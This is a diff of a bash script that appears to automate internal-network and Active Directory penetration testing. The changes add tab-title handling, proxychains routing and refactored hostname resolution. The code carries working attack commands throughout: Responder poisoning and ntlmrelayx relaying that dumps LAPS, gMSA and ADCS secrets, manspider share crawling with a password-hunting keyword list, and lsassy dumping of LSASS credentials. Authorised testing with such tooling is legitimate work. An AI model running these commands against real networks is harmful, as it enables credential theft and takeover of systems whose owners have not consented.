@@ -50,6 +50,15 @@ starter() {
 	CME_TIMEOUT=15 #increase in case of slow network
 	SNMP_TIMEOUT=5
 	SPACE='   '
+	
+	################### RENAME TAB ##############################
+	cat << 'EOF' > /tmp/set_title_tab.sh
+#!/bin/bash
+
+printf '\033]0;%s\007' "$1"
+EOF
+
+	chmod +x /tmp/set_title_tab.sh
 
 	################### VARIABLES ##############################
 	# Colors
@@ -121,13 +130,13 @@ banner () {
 
 ######################## 	POP UP LOGGER  ##########################
 pop_logger () {
-	if [ $(which terminator) ];then
+	if  which terminator > /dev/null 2>&1;then
 		#terminator --new-tab -m -e "tail -F /root/test" &
-		terminator --new-tab --title "Enumeration" -m -e "tail -F $logfile" &
+		terminator --new-tab -m -e "source /tmp/set_title_tab.sh Enumeration; tail -F $logfile" &
 	else
 		#export QT_QPA_PLATFORM=offscreen 
 		#qterminal -e "tail -F $logfile" &
-		x-terminal-emulator -e "tail -F $logfile" &
+		qterminal -e bash -c "source /tmp/set_title_tab.sh Enumeration; tail -F $logfile" &
 	fi
 	sleep 1
 }
@@ -227,7 +236,6 @@ nmap_fast () {
 	##Tri par ports :
 	log "${SPACE}[!] Sorting by opened ports ..."
 	fichier_nmap="$DIR/scan_nmap/scan_Full_Fast.nmap"
-	log "${SPACE}[!] Name Resolution machines ... "
 	
 	# Parcourir le fichier Nmap
 	#Initiliser le fichier ${DIR}/hostname_file.txt
@@ -253,6 +261,8 @@ nmap_fast () {
 			sort -u ${DIR_PORTS}/${port}.txt -o ${DIR_PORTS}/${port}.txt
 		fi
 	done < "$fichier_nmap"
+	
+	log "${SPACE}[!] Name Resolution machines ... "
 	resolve="0"
 	while IFS= read -r ligne; do
 		#Extraction de la résolution DNS des machines (si elle n'est pas résolue)
@@ -267,8 +277,15 @@ nmap_fast () {
 			regex_FQDN='FQDN: ([A-Za-z0-9.-]+)'
 			regex_RDP_info_DNS='DNS_Computer_Name: ([A-Za-z0-9.-]+)'
 			
-			if [[ $ligne == "Nmap scan report for"* ]] && grep -q ${ip} "${DIR_PORTS}/445.txt"; then
-				netexec smb ${ip} < /dev/null > ${DIR}/tmp_resolve.txt 2>/dev/null
+			if [[ $ligne =~ $regex_Host ]];then
+				host_nmap="${BASH_REMATCH[1]}"
+			fi
+			
+			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]]; then
+				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
+				resolve="1"
+			elif [[ $ligne == "Nmap scan report for"* ]] && grep -q ${ip} "${DIR_PORTS}/445.txt"; then
+				$proxychains netexec smb ${ip} < /dev/null > ${DIR}/tmp_resolve.txt 2>/dev/null
 				if [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+') ]] && ([[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'domain:\K[^)]+') ]] || [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'workgroup:\K[^)]+') ]]); then
 					# Extraire le nom, le domaine ou le workgroup à partir de la sortie
 					name=$(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+')
@@ -284,15 +301,11 @@ nmap_fast () {
 				#Delete potential non alphabetic caracters at the end (ex: ctf.lab0.)
 				domain_nmap="${BASH_REMATCH[1]}"
 				cleaned_domain=$(echo "$domain_nmap" | sed 's/[^a-zA-Z]*$//')
-			elif [[ $ligne =~ $regex_Host ]];then
-				host_nmap="${BASH_REMATCH[1]}"
-			elif [[ -n "$host_nmap" ]] && [[ -n "$cleaned_domain" ]];then
-				#If $host_nmap and $cleaned_domain are found, then write them to /etc/hosts
-				echo "${ip}:${host_nmap}.${cleaned_domain}" >> ${DIR}/hostname_file.txt
-				resolve="1"
-			elif [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]]; then
-				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
-				resolve="1"
+				if [[ -n "$host_nmap" ]] && [[ -n "$cleaned_domain" ]];then
+					#If $host_nmap and $cleaned_domain are found, then write them to /etc/hosts
+					echo "${ip}:${host_nmap}.${cleaned_domain}" >> ${DIR}/hostname_file.txt
+					resolve="1"
+				fi
 			elif [[ $ligne =~ $regex_FQDN ]] || [[ $ligne =~ $regex_RDP_info_DNS ]];then
 				FQDN="${BASH_REMATCH[1]}"
 				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
@@ -337,17 +350,17 @@ relay () {
 			sed -i '/^#.*dynamic_chain/s/^#//' "$config_file"
 			grep -q "^socks.* 127.0.0.1 1080" "$config_file" || echo 'socks4  127.0.0.1 1080' >> "$config_file"
 			responder -I eth0 -bd --wpad --lm --disable-ess -v; exec bash
-			if [ $(which terminator) ];then
+			if  which terminator > /dev/null 2>&1;then
 				#terminator --new-tab -m -e "tail -F /root/test" &
-				terminator --new-tab --title "responder" -m -e "responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; exec bash" &
+				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
 				sleep 1
-				terminator --new-tab --title "RelayNTLM" -m -e "/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; exec bash" &
+				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			else
 				#export QT_QPA_PLATFORM=offscreen 
 				#qterminal -e "tail -F $logfile" &
-				x-terminal-emulator -e "responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; exec bash" &
+				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
 				sleep 1
-				x-terminal-emulator -e "/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; exec bash" &
+				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
 		fi
 		green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
@@ -364,15 +377,15 @@ manspider () {
 		threads="100"
 		wordlist="confiden classified bastion '\bcode*.' creds credential wifi hash ntlm '\bidentifiant*.' compte utilisateur '\buser*.' '\b\$.*pass*.' '\root*.' '\b\$.*admin*.' '\badmin*.' account login '\bcpassword*.' '\bpassw*.' cred '\bpasse*.' '\b\$.*pass*.' 'mot de passe' cisco pfsense pfx ppk rsa pem ssh rsa '\bcard*.' '\bcarte*.' '\bidentite*.' '\bidentité*.' '\bpasseport*.'"
 		exclusions="--exclude-dirnames AppData --exclude-extensions DAT LOG2 LOG1 lnk msi"
-		request_manspider="manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
+		request_manspider="$proxychains manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
 		log "[🔍] Launching manspider"
 		log "[!]  If kerberos only : Netexec spider !"
-		if [ $(which terminator) ];then
-			terminator --new-tab --title "manspider" -m -e "$proxychains $request_manspider -u $Username $cme_creds $rangeIP; exec bash" &
+		if  which terminator > /dev/null 2>&1;then
+			terminator --new-tab -m -e "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $rangeIP; sleep 5d" &
 		else
 			#export QT_QPA_PLATFORM=offscreen 
 			#qterminal -e "tail -F $logfile" &
-			x-terminal-emulator -e "$request_manspider -u $Username $cme_creds $rangeIP; exec bash" &
+			qterminal -e bash -c "source /tmp/set_title_tab.sh Manspider; $request_manspider -u $Username $cme_creds $rangeIP; sleep 5d" &
 		fi
 	fi
 }
@@ -890,7 +903,6 @@ smb () {
 			fi
 			# Can i connect with input user ?
 			if [[ "$Username" != "anonymous" ]]; then
-				cat ${DIR_VULNS}/smb/cme_${ip}_basic
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic 2>/dev/null
 				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic"; then
 					#If NTLM is not supported, restart with kerberos
@@ -924,16 +936,20 @@ smb () {
 			if [ "$can_connect" = "1" ]; then
 				#List available shares
 				if [ "$Username" = "anonymous" ]; then
-					$proxychains smbmap --timeout 20 -H $host > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
-					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
-					blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$"
+					$proxychains timeout 7 smbmap -H $host --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
+					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
+						green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
+						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '' -p '' --exclude IPC$ --no-banner"
+					fi
 				else
-					$proxychains smbmap --timeout 20 -H $host -u "$Username" $cme_creds $kerberos > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
-					green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
-					if [ -n "$NT_Hash" ]; then
-						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
-					else
-						blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
+					$proxychains timeout 7 smbmap -H $host -u "$Username" $cme_creds --no-banner > ${DIR_VULNS}/smb/smbmap_${ip}_shares 2>/dev/null
+					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/smbmap_${ip}_shares"; then
+						green_log "${SPACE}[💀] Shares available are logged there -> ${DIR_VULNS}/smb/smbmap_${ip}_shares"
+						if [ -n "$NT_Hash" ]; then
+							blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
+						else
+							blue_log "${SPACE} [+] smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
+						fi
 					fi
 				fi
 				
@@ -1022,8 +1038,8 @@ smb () {
 							###### DUMP LSASS ######
 							$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M lsassy < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsass 2>/dev/null
 							check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)
-							
-							if [ "$check_smb" -gt 0 ]; then
+
+							if [[ "$check_smb" -gt 0 ]] && ! grep -q "No credentials found" "${DIR_VULNS}/smb/cme_${ip}_lsass"; then
 								green_log "${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
 							fi
 						else
